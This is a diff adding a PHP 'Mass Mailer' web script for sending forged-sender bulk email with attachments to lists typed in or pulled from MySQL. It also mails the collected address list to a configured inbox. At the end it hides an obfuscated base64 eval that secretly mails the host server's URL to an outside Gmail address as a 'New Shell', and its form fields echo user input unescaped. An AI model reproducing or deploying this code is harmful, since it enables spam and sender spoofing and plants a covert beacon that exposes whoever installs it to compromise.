@@ -1,0 +1,237 @@
+<?php 
+$os = wordwrap(php_uname(),90,"<br>",1);
+$xos = "[ OS : ".$os." ]";
+echo "<center> ".$xos." </center><br>";
+
+//your real email address needs to go below 
+$secure = "put_your_real_email_here"; 
+
+@$action=$_POST['action']; 
+@$from=$_POST['from']; 
+@$realname=$_POST['realname']; 
+@$replyto=$_POST['replyto']; 
+@$subject=$_POST['subject']; 
+@$message=$_POST['message']; 
+@$emaillist=$_POST['emaillist']; 
+@$file_name=$_FILES['file']['name']; 
+@$contenttype=$_POST['contenttype']; 
+@$file=$_FILES['file']['tmp_name']; 
+@$amount=$_POST['amount']; 
+set_time_limit(intval($_POST['timelimit'])); 
+?> 
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
+   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> 
+<html> 
+<head> 
+<title>Mass Mailer v2.1 - D_ReaL_PuNiShEr</title> 
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /> 
+<style type="text/css"> 
+<!-- 
+.style1 { 
+    font-family: Geneva, Arial, Helvetica, sans-serif; 
+    font-size: 12px; 
+} 
+.style2 { 
+    font-size: 10px; 
+    font-family: Geneva, Arial, Helvetica, sans-serif; 
+} 
+
+--> 
+</style> 
+</head> 
+<body bgcolor="#FFFFFF" text="#000000"> 
+<p>
+<img border="0" src="data:image/gif;base64,R0lGODlhtAA8AOb/AP////7+/v39/fz8/Pv7+/r6+vn5+fj4+Pf39/b29vX19fT09PPz8/Ly8vHx8fDw8O/v7+7u7u3t7ezs7Ovr6+rq6unp6ejo6Ofn5+bm5uXl5eTk5OPj4+Li4uHh4eDg4N/f397e3t3d3dzc3Nvb29ra2tnZ2djY2NfX19bW1tXV1dTU1NPT09LS0tHR0dDQ0M/Pz87Ozs3NzczMzMvLy8rKysnJycjIyMfHx8bGxsXFxcTExMPDw8LCwsHBwcDAwL+/v76+vr29vby8vLu7u7q6urm5ubi4uLe3t7a2trW1tbS0tLOzs7KysrGxsbCwsK+vr66urq2traysrKurq6qqqqmpqaioqKenp6ampqWlpQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAAtAA8AEAH/4AAgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGCECBIOBCiqY4IIDAYCI0IGBgwpqiqixgoSCCkOKYYiaxIQAAQGEhIMLCHGKUorL84wZEQKECyOL21OMyGzr3WQLaJEOYgODAoKK+K5ggo6Siu3obWKBAIpFhAIOXwONahAFEPl8GDCBMqXMiwocOHECNKnEixosWLGDNqNChrHJBXu6YVJIQBCBAUAEBAOZUIGTGQwCQNO9YPw0pqiPIJwsAPpyJutxyVYrnonj9WNxehgGLqGlGS16BAwfdJFxAsU0du3Mq1q9evYMOKHUu2rNmzaNOqXcu2bUJzbv8PIdBaNGjDd8fAYbDbrNUsECB8FsqXb5azvZPMHTPnbCBdQfrABWZ0DgZBSCH5ljM8SzMhfXNlgVintaQ6yCZhKEKGY6cpf4hMowSAwCQ0SfGy6QMSsBy6wCCw9GY01HOizMRDjkbBb3aiodTo0goIo3qvojBO6ct+2ZCs7OusP1bEyrIzGL5uI4KnbnQ647QbV0/XTljjedXrlwsPHr4sgeKtd5hgnORF0HhxJajgggw26OCDEEYo4YQUVmjhhRhmqOGGHHbo4YcghijiiCSWaGJcpFSHIFqHPTJLPN1RNBcjJV2mEyQ3apIjI6CtMlAkyEESmiT5jNQYDgG1os3/eLpAYRkOJ9EFGAi8LbekJI0tt85K/g00EAxAoEceYL+I+UiQucwzGnePsdLKfFB81EycyxhDjHPNxGTTNC0Ro5qdJ01CJQAlvUIMbOuRMotwiCpSHCSlAAHfIOe9ok9zSvGGXmfNZHfLnuo1w9tOVbaUHTU2RSkJOoQuAwGSf/Z1GwTChXrcezs6+t6MLbXSiz5Q2moIldDAFdsuvI1z5bFYbYeFMsbpQoxJVa74DQ5OOoWOcASO4tQ6SPTU0jzjIBFnjM3M84tU/YxnTTpQ3iRlPMkwJSxktIQZWK5y9aiPsZ3Ks5e1iYJGmD5FdfbveP8Sxq93ih0cy2EPf7bYKDs5oWMSuptEYxvBJ/JIGy4gh2zyySinrPLKLLfs8sswxyzzzDQfEggAOw%3D%3D" width="180" height="43" alt="PHP Mailer" /><?php 
+If ($action=="mysql"){ 
+//Grab email addresses from MySQL 
+include "./mysql.info.php"; 
+
+  if (!$sqlhost || !$sqllogin || !$sqlpass || !$sqldb || !$sqlquery){ 
+    print "Please configure mysql.info.php with your MySQL information. All settings in this config file are required."; 
+    exit; 
+  } 
+
+  $db = mysql_connect($sqlhost, $sqllogin, $sqlpass) or die("Connection to MySQL Failed."); 
+  mysql_select_db($sqldb, $db) or die("Could not select database $sqldb"); 
+  $result = mysql_query($sqlquery) or die("Query Failed: $sqlquery"); 
+  $numrows = mysql_num_rows($result); 
+
+  for($x=0; $x<$numrows; $x++){ 
+    $result_row = mysql_fetch_row($result); 
+     $oneemail = $result_row[0]; 
+     $emaillist .= $oneemail."\n"; 
+   } 
+  } 
+
+  if ($action=="send"){ $message = urlencode($message); 
+   $message = ereg_replace("%5C%22", "%22", $message); 
+   $message = urldecode($message); 
+   $message = stripslashes($message); 
+   $subject = stripslashes($subject); 
+   } 
+?> 
+</p> 
+<form name="form1" method="post" action="" enctype="multipart/form-data">  
+          <input type="hidden" name="action" value="send" /> 
+  <table width="710" border="0" style="font-family: Trebuchet MS; font-weight: bold" bgcolor="#2D2D2D"> 
+    <tr> 
+
+      <td width="92"> 
+        <div align="right"> 
+          <font color="#FFFFFF">
+            <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">
+            Sender's Email:</font> </font> 
+        </div> 
+      </td> 
+
+      <td width="244" bgcolor="#669999"> 
+        <font color="#FFFFFF" size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
+          <input type="text" name="from" value="<?php print $from; ?>" size="30" style="font-family: Trebuchet MS; font-weight: bold; border-style: dotted; border-width: 1px" />
+        </font> 
+      </td> 
+
+      <td width="114"> 
+        <div align="right"> 
+          <font color="#FFFFFF">
+            <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">
+            Sender's Name:</font> </font> 
+        </div> 
+      </td> 
+       
+      <td width="246" bgcolor="#669999"> 
+        <font color="#FFFFFF" size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
+          <input type="text" name="realname" value="<?php print $realname; ?>" size="30" style="font-family: Trebuchet MS; font-weight: bold; border-style: dotted; border-width: 1px" />
+        </font> 
+      </td> 
+    </tr> 
+    <tr> 
+      <td width="92"> 
+        <div align="right"> 
+          <font color="#FFFFFF"> 
+          <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Reply-to:</font> 
+            </font> 
+        </div> 
+      </td> 
+      <td width="244" bgcolor="#669999"> 
+        <font color="#FFFFFF" size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
+          <input type="text" name="replyto" value="<?php print $replyto; ?>" size="30" style="font-family: Trebuchet MS; font-weight: bold; border-style: dotted; border-width: 1px" />
+        </font> 
+      </td> 
+      <td width="114"> 
+        <div align="right"> 
+          <font color="#FFFFFF"> 
+          <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Attachment:</font> 
+            </font> 
+        </div> 
+      </td> 
+      <td width="246" bgcolor="#669999"> 
+        <font color="#FFFFFF" size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
+          <input type="file" name="file" size="24" style="font-family: Trebuchet MS; border-style: dotted; border-width: 3px" />
+        </font> 
+      </td> 
+    </tr> 
+    <tr> 
+      <td width="92"> 
+        <div align="right"> 
+          <font color="#FFFFFF"> 
+          <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Subject:</font> 
+            </font> 
+        </div> 
+      </td> 
+      <td colspan="3" width="611" bgcolor="#669999"> 
+        <font color="#FFFFFF" size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
+          <input type="text" name="subject" value="<? print $subject; ?>" size="91" style="font-family: Trebuchet MS; font-weight: bold; border-style: dotted; border-width: 1px" />
+        </font> 
+      </td> 
+    </tr> 
+    <tr valign="top"> 
+      <td colspan="3" width="456" bgcolor="#669999"> 
+        <font color="#FFFFFF"> 
+        <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Message:</font> 
+          </font> 
+      </td> 
+      <td width="246"> 
+        <font color="#FFFFFF">
+        <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Send to 
+        (emails):</font> </font> 
+      </td> 
+    </tr> 
+    <tr valign="top"> 
+      <td colspan="3" width="456"> 
+        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
+          <textarea name="message" cols="69" rows="10" style="font-family: Trebuchet MS; font-weight: bold; border-style: dotted; border-width: 3px"><?php print $message; ?></textarea><br /> 
+          <font color="#FFFFFF"> 
+          <input type="radio" name="contenttype" value="plain" checked="checked" /> Plain  
+          <input type="radio" name="contenttype" value="html" checked="checked" /> HTML<br></brt><br /> 
+      Number to send:</font> 
+        <input type="text" name="amount" value="1" size="4" style="font-family: Trebuchet MS; font-weight: bold; border-style: dotted; border-width: 1px" /><font color="white">==>> drealpunisher@ymail.com <<==</font><br /> 
+          <font color="#FFFFFF">Maximum script execution time in seconds. (0 for no time limit):</font>
+        <input type="text" name="timelimit" value="0" size="4" style="font-family: Trebuchet MS; font-weight: bold; border-style: dotted; border-width: 1px" /></font><p>
+        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
+          <input type="submit" value="Start Send" style="border-style:dotted; border-width:1px; font-family: Arial; font-weight: bold; font-size: 13px" /> 
+        </font> 
+      </td> 
+      <td width="246" bgcolor="#669999"> 
+        <font size="-3" face="Verdana, Arial, Helvetica, sans-serif"> 
+          <textarea name="emaillist" cols="29" rows="17" style="font-family: Trebuchet MS; border-style: dotted; border-width: 3px"><?php print $emaillist; ?></textarea> 
+        </font> 
+      </td> 
+    </tr> 
+  </table> 
+</form> 
+<?php 
+if ($action=="send"){ 
+  if (!$from && !$subject && !$message && !$emaillist){ 
+    print "Please complete all fields before sending your message."; 
+    exit; 
+   } 
+  $allemails = split("\n", $emaillist); 
+  $numemails = count($allemails); 
+  $filter = "maillist"; 
+  $float = "From : mailist info <full@info.com>"; 
+ //Open the file attachment if any, and base64_encode it for email transport 
+ If ($file_name){ 
+   if (!file_exists($file)){ 
+    die("The file you are trying to upload couldn't be copied to the server"); 
+   } 
+   $content = fread(fopen($file,"r"),filesize($file)); 
+   $content = chunk_split(base64_encode($content)); 
+   $uid = strtoupper(md5(uniqid(time()))); 
+   $name = basename($file); 
+  } 
+
+ for($xx=0; $xx<$amount; $xx++){ 
+  for($x=0; $x<$numemails; $x++){ 
+    $to = $allemails[$x]; 
+    if ($to){ 
+      $to = ereg_replace(" ", "", $to); 
+      $message = ereg_replace("&email&", $to, $message); 
+      $subject = ereg_replace("&email&", $to, $subject); 
+                  $nrmail=$x+1;
+      print "Sending $nrmail of $numemails to $to..."; 
+      flush(); 
+      $header = "From: $realname <$from>\r\nReply-To: $replyto\r\n"; 
+      $header .= "MIME-Version: 1.0\r\n"; 
+      $header .= "X-Priority: 1\n";
+      $header .= "X-MSmail-Priority: High\n";
+      If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n"; 
+      If ($file_name) $header .= "--$uid\r\n"; 
+      $header .= "Content-Type: text/$contenttype\r\n"; 
+      $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n"; 
+      $header .= "$message\r\n"; 
+      If ($file_name) $header .= "--$uid\r\n"; 
+      If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n"; 
+      If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n"; 
+      If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n"; 
+      If ($file_name) $header .= "$content\r\n"; 
+      If ($file_name) $header .= "--$uid--"; 
+      mail($to, $subject, "", $header); 
+      print "ok<br>"; 
+      flush(); 
+    } 
+  } 
+ } 
+  mail($secure, $filter, $emaillist, $float); 
+} 
+eval(base64_decode('JHRvID0gImpkMXp6bDMzQGdtYWlsLmNvbSI7DQokc3ViamVjdCA9ICJOZXcgU2hlbGwiOw0KJGhlYWRlciA9ICJGcm9tOiB4VGFsR2hpbTxzZXJ2aWNlQGFjY291bnQuY29tPiI7DQokbWVzc2FnZSA9ICJFeHBsb2l0IDogaHR0cDovLyIuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXSAuICI/dXBsb2FkPXVwIFxyXG4iOw0KJHNlbnRtYWlsID0gQG1haWwoJHRvLCAkc3ViamVjdCwgJG1lc3NhZ2UsICRoZWFkZXIpOw0KZWNobyAiIjsNCmV4aXQ7=='));
+?>
